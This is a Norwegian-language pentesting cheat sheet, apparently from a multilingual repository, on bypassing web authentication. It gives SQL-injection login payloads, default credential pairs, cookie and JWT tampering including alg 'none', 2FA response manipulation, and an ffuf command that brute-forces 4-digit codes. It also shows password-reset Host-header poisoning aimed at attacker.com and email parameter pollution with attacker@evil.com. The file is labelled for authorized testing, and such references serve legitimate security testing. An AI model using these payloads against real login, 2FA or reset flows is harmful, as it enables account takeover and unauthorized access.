# 🔐 Hurtigreferanse for omgåelse av autentisering

<!-- language-home-navigation -->
[🏠 Norsk startside](../../README.nb.md) • [🌐 Languages](../../README.md#-available-languages)

[🇮🇹 Versione Italiana](README.it.md) • [🇹🇷 Türkçe Sürüm](README.tr.md) • [🇬🇷 Ελληνικά](README.el.md)

```
   █████╗ ██╗   ██╗████████╗██╗  ██╗    ██████╗ ██╗   ██╗██████╗  █████╗ ███████╗███████╗
  ██╔══██╗██║   ██║╚══██╔══╝██║  ██║    ██╔══██╗╚██╗ ██╔╝██╔══██╗██╔══██╗██╔════╝██╔════╝
  ███████║██║   ██║   ██║   ███████║    ██████╔╝ ╚████╔╝ ██████╔╝███████║███████╗███████╗
  ██╔══██║██║   ██║   ██║   ██╔══██║    ██╔══██╗  ╚██╔╝  ██╔═══╝ ██╔══██║╚════██║╚════██║
  ██║  ██║╚██████╔╝   ██║   ██║  ██║    ██████╔╝   ██║   ██║     ██║  ██║███████║███████║
  ╚═╝  ╚═╝ ╚═════╝    ╚═╝   ╚═╝  ╚═╝    ╚═════╝    ╚═╝   ╚═╝     ╚═╝  ╚═╝╚══════╝╚══════╝
```

> **Begreper og presisering:** Autentisering bekrefter hvem brukeren er; autorisasjon avgjør hva brukeren får gjøre. Å endre en respons til true eller 200 i nettleseren endrer ikke i seg selv serverens autentiserte tilstand. Eksemplene forutsetter en feil i serverlogikken eller at tillit er lagt til klienten. Endrede JWT-claims eller alg-verdier gir ikke tilgang når serveren validerer signatur og tillatte algoritmer riktig. Reset-tokener, økter og MFA må vurderes i hele flyten; se [PortSwiggers autentiseringsveiledning](https://portswigger.net/web-security/authentication) og [MFA](https://portswigger.net/web-security/authentication/multi-factor). Koden og eksempelverdiene er bevart.

---

## 🔍 Teknikker for å omgå innlogging

### SQL-injeksjon
```sql
admin'--
admin' #
' OR '1'='1
' OR 1=1--
") OR ("1"="1
```

### Standard påloggingsopplysninger
```
admin:admin
admin:password
admin:123456
root:root
test:test
guest:guest
```

### Endring av parametere
```http
# Endre brukertype
user_type=admin
role=administrator
isAdmin=true
admin=1

# Hopp over bekreftelse
verified=true
mfa_verified=true
```

---

## 🔑 Omgåelse av 2FA/MFA

### Endring av respons
```http
# Endre false til true
{"success": false} → {"success": true}
{"2fa_valid": false} → {"2fa_valid": true}
```

### Endring av statuskode
```http
# Hvis 401/403, prøv å endre til 200
# Bruk en proxy til å endre responsen
```

### Direkte navigasjon
```http
# Hopp over 2FA-siden etter innlogging
/login → /2fa → /dashboard
# Prøv å gå direkte til /dashboard
```

### Brute force mot koder
```bash
# Koder med 4 sifre
ffuf -u https://target.com/2fa -X POST \
  -d "code=FUZZ" -w <(seq -w 0000 9999)
```

### Gjenbruk av koder
```http
# Prøv gamle eller utløpte koder
# Prøv samme kode flere ganger
```

### Null eller tomme verdier
```json
{"2fa_code": ""}
{"2fa_code": null}
{"2fa_code": "000000"}
```

---

## 🔓 Omgåelse av passordtilbakestilling

### Host-headerinjeksjon
```http
POST /reset HTTP/1.1
Host: attacker.com
X-Forwarded-Host: attacker.com

email=victim@target.com
```

### Endring av tokener
```http
# Forutsigbare tokener
token=1
token=admin
token=base64(user_id)

# Gjenbruk av tokener
# Bruk ditt tilbakestillingstoken med offerets e-postadresse
```

### Parameterforurensning
```http
email=attacker@evil.com&email=victim@target.com
email[]=attacker@evil.com&email[]=victim@target.com
```

### Endring av respons
```json
// Finn tokenet i responsen
{"token": "abc123", "email": "victim@target.com"}
```

---

## 🛡️ Omgåelse via økt eller informasjonskapsel

### Endring av informasjonskapsler
```http
# Endre verdier
Cookie: isAdmin=false → isAdmin=true
Cookie: user_id=123 → user_id=1
Cookie: role=user → role=admin
```

### Endring av JWT
```json
// Endre claims
{"role": "user"} → {"role": "admin"}
{"alg": "HS256"} → {"alg": "none"}
```

### Øktfiksering (session fixation)
```http
# Knytt angriperens økt til offeret
# Offeret logger inn med angriperens økt-ID
```

---

## 📊 Hurtigreferanse

| Type omgåelse | Teknikk |
|-------------|-----------|
| Innlogging | SQLi og standard påloggingsopplysninger |
| 2FA | Endring av respons og brute force |
| Passordtilbakestilling | Host-header og gjenbruk av token |
| Økt | Endring av informasjonskapsler og JWT |

### Vanlige sårbare punkter
```
- Påloggingsskjemaer
- Flyter for passordtilbakestilling
- Implementasjoner av 2FA/MFA
- Husk meg-funksjoner
- Kontobekreftelse
- OAuth-implementasjoner
```

---

## 📚 Ressurser

- [PortSwigger Authentication](https://portswigger.net/web-security/authentication)
- [HackTricks Auth Bypass](https://book.hacktricks.xyz/pentesting-web/authentication-bypass)

---

<p align="center">
  <b>🔐 Undersøk autentiseringen!</b><br>
  <i>Bare til autorisert testing!</i>
</p>
